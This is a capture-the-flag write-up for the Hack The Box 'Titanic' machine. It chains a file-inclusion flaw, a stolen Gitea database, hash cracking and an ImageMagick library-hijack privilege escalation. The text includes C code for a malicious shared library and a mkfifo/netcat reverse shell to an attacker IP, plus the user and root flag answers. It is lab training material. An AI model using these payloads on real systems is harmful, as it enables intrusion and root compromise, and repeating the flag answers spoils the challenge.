# Titanic (Easy)

## <mark style="color:blue;">Description</mark>

* **Difficult** <mark style="color:green;">**->**</mark> Easy
* **OS** <mark style="color:green;">**->**</mark> Linux
* **State** <mark style="color:green;">-></mark> Retired
* **Tags** <mark style="color:green;">-></mark> Pending

<figure><img src="../../.gitbook/assets/image (867).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/machines/648">https://app.hackthebox.com/machines/648</a></p></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* I started doing an initial port scan using [_Nmap_](../../networks/tools-and-utilities.md#nmap)

{% code lineNumbers="true" %}
```bash
nmap 10.129.64.89 -p- -Pn --min-rate 2500 -oN scan.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (820).png" alt=""><figcaption></figcaption></figure>

***

* Then I did an exhaustive scan to learn more about the services running on the open ports

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap 10.129.64.89 -p22,80 -sVC -oN serv_scan.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (822).png" alt=""><figcaption></figcaption></figure>

***

* I found an HTTP service on port 80, so I tried accessing the content in the browser. I got redirected to a domain _titanic.htb_ but I couldn't access it because it wasn't in my list of known hosts, so I added it to the _/etc/hosts_ file and retried to access the web, this time successfully reaching the content of a site for booking trips

<figure><img src="../../.gitbook/assets/image (821).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
echo "10.129.64.89 titanic.htb" >> /etc/hosts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (823).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
{% endhint %}

***

* Exploring the page and reading the source code, I didn't find anything relevant apart from a form to book a trip. After filling in some data and submitting the information, the page processed the request and downloaded a summary of the booking in a _JSON_ file named with what appeared to be a hashed value. This caught my attention because maybe this value meant something internally for the server

<figure><img src="../../.gitbook/assets/image (798).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (829).png" alt=""><figcaption></figcaption></figure>

***

* So to check how the petition was being sent and handled, I retried filling and submitting the form, this time intercepting the petition using [_FoxyProxy_](../../web-exploitation/tools-and-utilities.md#foxyproxy) and [_Burp Suite_](../../web-exploitation/tools-and-utilities.md#burp-suite). I noticed the site was sending a POST petition to a _/book_ route, which could be interesting, and afterwards also sending a petition to a _/download_ route, specifying the JSON file to be downloaded

<figure><img src="../../.gitbook/assets/image (799).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (830).png" alt=""><figcaption></figcaption></figure>

***

* As the ticket was invoking the file by its complete name, maybe it was searching it directly in the file system of the server, so this could be vulnerable to a File Inclusion vulnerability. So for testing this, I put the typical _/etc/passwd_ route and saw it retrieved the content of the file, confirming it was vulnerable

<figure><img src="../../.gitbook/assets/image (800).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about Local File Inclusion exploitation, you can go [here](../../web-exploitation/broken-access-control/local-file-inclusion.md)
{% endhint %}

***

* With this information, I checked the content provided and found there was a user _developer_ in the system who had a possibly accessible _/home_ folder. So I tried searching in that path for a _user.txt_ file, and luckily it was there, giving me the user flag

<figure><img src="../../.gitbook/assets/image (832).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (801).png" alt=""><figcaption></figcaption></figure>

***

* With that, I got the user flag

<figure><img src="../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>

> Answer: _**d92e1ef5ce5d1b8244f554886f0a86b2**_

***

* I tried looking for anything else interesting with the LFI but found nothing, so I tried fuzzing the page to possibly find other routes exposed. First tried with folders under the same domain but got nothing, so I tried with subdomains and fortunately found a _dev.titanic.htb_ subdomain that seemed interesting. So I visited this site, once again adding it to the known hosts, and found a website with a version control interface in the [_GitHub_](https://github.com/) style

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://titanic.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -o fuzz.txt --append-domain | grep "Status: 200"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
echo "10.129.64.89 titanic.htb" >> /etc/hosts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (789).png" alt=""><figcaption></figcaption></figure>

***

* Exploring the site, I found information about two users, one named _administrator_ who didn't give me relevant information, and the other named _developer_. For this last one, there were two repositories, so I explored first the _docker-config_ repository and found some credentials for a MySQL database. Then I went to the _flask-app_ repository and also found some interesting details about the deployment of the service, especially the path where it was being exposed to the web&#x20;

<figure><img src="../../.gitbook/assets/image (803).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (804).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (805).png" alt=""><figcaption></figcaption></figure>

***

* So knowing this, I could try to look for the files in that route and possibly retrieve their content. So after some attempts and using the information previously found, I tried using the name of the project as the same for the internal database and with the _.db_ extension, and fortunately, I found a [_SQLite3_](../../database-attacks/sql/sqlite3.md) database

<figure><img src="../../.gitbook/assets/image (806).png" alt=""><figcaption></figcaption></figure>

***

* So to explore it, I used that download feature to get the database locally and then access it with the _SQLite3_ command line utility. First, I checked which tables were available in the database, finding one named _user_ that could be interesting

{% code overflow="wrap" lineNumbers="true" %}
```bash
sqlite3 gitea.db
sqlite> .tables
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (808).png" alt=""><figcaption></figcaption></figure>

***

* I listed all the table contents, finding two rows each for the users I had seen on the webpage and a lot of entries that I didn't understand at the time, but some of them seemed to be hashes. Also, one of the entries had the value _pbkdf2$50000$50_, and with a little research, I understood was an iterative hashing method and used a salt value

{% code overflow="wrap" lineNumbers="true" %}
```sql
sqlite> SELECT * FROM user;
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (809).png" alt=""><figcaption></figcaption></figure>

***

* I thought maybe some of the other entries of the row could give me more information related to this hash and how it was being used, so I used the _PRAGMA_ command to get information about it and found two entries were giving me the hash for the password of the user and the respective salt being used

{% code overflow="wrap" lineNumbers="true" %}
```sql
sqlite> PRAGMA table_info(user);
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (796).png" alt=""><figcaption></figcaption></figure>

***

* So with this, I could try to crack the password for the users. After investigating how to do this, I started with the _developer_ user, saving its hash in the correct format and using [_Hashcat_](../../cryptography/tools-and-utilities.md#hashcat) to do the cracking process, specifying the hash that was used. After a few minutes, I noticed the hash had been broken, giving me the password _25282528_. I repeated the process with the hash for the _administrator_ user but wasn't possible to break it

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>echo "sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=" > hash.txt
</strong>hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre>

<figure><img src="../../.gitbook/assets/image (802).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (795).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

***

* So I tried using this to connect to the machine with the _developer_ user via the SSH protocol, and fortunately, I logged in successfully. After that, I sanitized the terminal to work more comfortably

{% code overflow="wrap" lineNumbers="true" %}
```bash
ssh developer@10.129.64.89
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (797).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the SSH protocol, you can go [here](../../networks/protocols/ssh.md), and to learn more about the sanitization process, you can go [here](../../linux/useful-shell-resources.md#tty-sanitization)
{% endhint %}

***

* Once in the system, I had to escalate privileges, so I started looking for any possible path to achieve it. I checked execution permissions and running services, but didn't find anything relevant. So I did an enumeration of folders that could be interesting and for which the user had access permissions. After a while, I reached the _/opt_ folder, usually used for the installation of third-party applications and mounting of projects, where I found the folder for the web application that was also on one of the repositories, and listed all that was inside&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
tree -a
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

***

* I found the identify\_images.sh script interesting, so I read its content to know what actions it was doing. In short, it was accessing the folder under the app files where the images were saved, deleting the content of a _metadata.log_ file, and using the [_ImageMagick_](https://imagemagick.org/index.php) tool to take the metadata from the _.jpg_ files and save it to the log file. I confirm this information by looking at the content of the _metadata.log_ file

<figure><img src="../../.gitbook/assets/image (857).png" alt=""><figcaption></figcaption></figure>

***

* I was curious if the use of this tool could be leveraged for the escalation, so I searched the web for possible vulnerabilities. I found an interesting [repository](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8) with an RCE vulnerability for a recent version of the tool. To confirm it will apply in that situation, I looked for the version of this tool on the system, and that the script was owned by the _root_ user. I confirmed that it was a vulnerable version, and the file was owned by the target user, so I could exploit it

<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (858).png" alt=""><figcaption></figcaption></figure>

***

* So I went to the folder where the script was going to act and based on the repository created a _C_ script with a test payload using the `sudo id` command. Then I compiled it as the _libxcb.so.1_ library that _Magick_ was about to use and ran the _magick_ command in the same form as the script. I got a notification about the user not being in the sudoers file, but confirmed it worked by looking at the _metadata.log,_ where the results were supposed to be saved, having RCE as the _root_ user

{% code overflow="wrap" lineNumbers="true" %}
```bash
nano test.c
gcc test.c -fPIC -shared -o libxcb.so.1 -nostartfiles
magick identify entertainment.jpg
cat metadata.log
```
{% endcode %}

{% code title="test.c" overflow="wrap" lineNumbers="true" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("sudo id");
    exit(0);
}
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

***

* With this, I created a new file, changing the payload to one that could help me gain a Reverse Shell. I set a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener to receive the connection and established the payload, indicating the IP of my machine and the port where I was listening. Then I did the compiling process and ran the _magick_ tool again, successfully gaining a shell as the _root_ user

{% code overflow="wrap" lineNumbers="true" %}
```bash
#On my machine
nc -nvlp 4444

#On the target machine
nano shell.c
gcc shell.c -fPIC -shared -o libxcb.so.1 -nostartfiles
magick identify entertainment.jpg
```
{% endcode %}

{% code title="shell.c" overflow="wrap" lineNumbers="true" %}
```c
include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("sudo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 4444 >/tmp/f");
    exit(0);
}
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (863).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (865).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the Reverse Shell and how to script it, you can go [here](../../scripting/reverse-shell.md)
{% endhint %}

***

* Finally, I navigated to the _/root_ folder where I found a _root.txt_ file, and reading its content, I got the root flag

<figure><img src="../../.gitbook/assets/image (864).png" alt=""><figcaption></figcaption></figure>

***

* With that, I got the root flag and pwned the machine

<figure><img src="../../.gitbook/assets/image (245) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**b6b99f7b44928603d26be1c7abae4d5c**_
